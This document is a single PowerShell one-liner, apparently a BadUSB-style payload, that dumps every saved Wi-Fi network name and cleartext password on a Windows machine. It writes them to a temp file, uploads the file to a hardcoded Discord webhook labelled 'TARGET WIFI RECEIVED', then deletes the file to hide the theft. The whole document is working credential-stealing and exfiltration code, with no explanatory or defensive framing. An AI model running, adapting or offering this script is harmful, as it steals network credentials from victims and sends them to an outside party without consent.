(netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $profile = ($_ -split ':')[1].Trim(); $key = (netsh wlan show profile name="$profile" key=clear | Select-String 'Key Content' | ForEach-Object { ($_ -split ':')[1].Trim() }); [PSCustomObject]@{ WiFiName = $profile; Password = if ($key) { $key } else { 'No password or not retrievable' } } } | Out-File -FilePath "$($env:TEMP)\wifi.txt"; Start-Sleep -Seconds 10; $webhookUrl="https://discord.com/api/webhooks/1132653778835877898/2GlcpntOhcfWYO0gNv9zAle7j3X0kblOAZyrwWJvijAwnJjY3zb-_wwnfu1-AjBBkmot";$filePath="$env:TEMP\wifi.txt";$boundary=[System.Guid]::NewGuid().ToString();$headers=@{"Content-Type"="multipart/form-data; boundary=$boundary"};$body="--$boundary`r`nContent-Disposition: form-data; name=`"payload_json`"`r`nContent-Type: application/json`r`n`r`n{`"content`":`"TARGET WIFI RECEIVED`"}`r`n--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"wifi.txt`"`r`nContent-Type: text/plain`r`n`r`n$(Get-Content -Raw -Path $filePath)`r`n--$boundary--";Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body; Start-Sleep -Seconds 5; Remove-Item -Path "$env:TEMP\wifi.txt" -Force